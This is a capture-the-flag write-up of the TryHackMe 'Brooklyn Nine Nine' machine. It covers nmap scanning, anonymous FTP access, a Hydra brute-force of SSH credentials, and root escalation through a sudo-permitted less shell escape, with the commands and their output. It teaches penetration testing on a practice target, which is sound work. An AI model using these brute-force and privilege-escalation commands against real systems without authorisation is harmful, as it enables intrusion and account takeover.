---
layout: single
title: THM - Brooklyn Nine Nine
date: 2025-11-02
classes: wide
header:
  teaser: /assets/images/thm-brooklyn-nine-nine/logo.png
  teaser_home_page: true
categories:
  - TryHackMe
  - Easy
  - Linux
tags:
  - password-bruteforcing
  - suid-abuse
---


# Introduction
-------------

This writeup documents the penetration testing of the [**Brooklyn Nine Nine**](https://tryhackme.com/room/brooklynninenine) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this case I'll enumerate the web service and FTP service to brute-force SSH credentials and privesc with a SUID binary.

<br>
# Information Gathering
------------------

After identifying the target's IP address, we need to enumerate as  much information as possible about the host. A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. [**ttl-ripper.sh**](https://github.com/Akronox/WichSystem.py) can also be used for this purpose.
* TTL 64: Linux.
* TTL 128: Windows.

```
❯ ping -c 1 10.10.204.88
PING 10.10.204.88 (10.10.204.88) 56(84) bytes of data.
64 bytes from 10.10.204.88: icmp_seq=1 ttl=63 time=57.3 ms

--- 10.10.204.88 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 57.267/57.267/57.267/0.000 ms
```

In this case, it seems to be a Linux machine. Let's perform some scans.

```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.204.88 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 21:15 CET
Initiating SYN Stealth Scan at 21:15
Scanning 10.10.204.88 [65535 ports]
Discovered open port 80/tcp on 10.10.204.88
Discovered open port 21/tcp on 10.10.204.88
Discovered open port 22/tcp on 10.10.204.88
Completed SYN Stealth Scan at 21:15, 19.59s elapsed (65535 total ports)
Nmap scan report for 10.10.204.88
Host is up, received user-set (0.057s latency).
Scanned at 2025-11-02 21:15:04 CET for 20s
Not shown: 56890 closed tcp ports (reset), 8642 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
           Raw packets sent: 97154 (4.275MB) | Rcvd: 58618 (2.345MB)
```

```
❯ nmap -sCV -p21,22,80 10.10.204.88 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 21:16 CET
Nmap scan report for 10.10.204.88
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.78.182
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
```

Nmap found some open ports. The intrussion is probably going to be, or at least start, from port 80 or 21 using the user anonymous. You can Google the Apache or SSH version followed by “launchpad” to get a good hint about the OS. You can also check the blog’s [Enumeration Cheat Sheet](https://pwnerguy.github.io/enumeration-cheatsheet/), which includes a table mapping service versions to possible operating system versions. We are facing an **Ubuntu Bionic**.

We can't do much with the SSH service since we don't have credentials yet, later we'll enumerate the port 21. Now it's time to enumerate the web server running on the port 80:

```
❯ whatweb http://10.10.204.88
http://10.10.204.88 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.204.88]
```

![](/assets/images/thm-brooklyn-nine-nine/web.png)

In the page code there's a interesting comment.

```html
<!-- Have you ever heard of steganography? -->
```

Yes, I've heard of it, in fact, today in the Easy Peasy machine. Let's try the same thing, but we need a credential to do that.

Now, let's enumerate the FTP service.

![](/assets/images/thm-brooklyn-nine-nine/ftp.png)

<br>
# Vulnerability Assessment
-----------

Jake's password seems to be very weak. We can now try the user jake and brute-force his password to do the SSH intrussion. I'll try to crack jake's password with **Hydra**.

<br>
# Exploitation
----

```
❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.204.88 ssh
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-02 21:33:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.204.88:22/
[22][ssh] host: 10.10.204.88   login: jake   password: ***REDACTED_PASSWORD***
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-02 21:33:39
```

We got the credentials. Now we have access to the server via SSH.

<br>
# Post-Exploitation
----------

We need to find a way to escalate privileges. To find ways to do that in Linux I normally use **linpeas**, but I throwed ``sudo -l`` and noticed that I had permissions to execute ``/usr/bin/less`` which is a symbolic link of the binary ``/bin/less``.

```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
jake@brookly_nine_nine:~$ ls -l less
lrwxrwxrwx 1 root root 9 Feb  3  2020 less -> /bin/less
jake@brookly_nine_nine:~$ ls -l /bin/less
-rwsr-xr-x 1 root root 170760 Dec  1  2017 less
```

We have permissions to execute this binary as root. So, I went to [**GTFOBins**](https://gtfobins.github.io/gtfobins/less/) and I saw many different ways to spawn a shell with **less**.

```
jake@brookly_nine_nine:~$ sudo less /etc/profile
WARNING: terminal is not fully functional
!/bin/shfile  (press RETURN)
# whoami
root
# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: ***REDACTED***
```

In this case, I got the root flag before the user flag since I had an easy way to privesc to root. 

```
# cd /home/holt
# ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26  2020 .
drwxr-xr-x 5 root root 4096 May 18  2020 ..
-rw------- 1 holt holt   18 May 26  2020 .bash_history
-rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
drwx------ 2 holt holt 4096 May 18  2020 .cache
drwx------ 3 holt holt 4096 May 18  2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-rw-r--r-- 1 holt holt  807 May 17  2020 .profile
drwx------ 2 holt holt 4096 May 18  2020 .ssh
-rw------- 1 root root  110 May 18  2020 nano.save
-rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
# cat user.txt
***REDACTED***
```
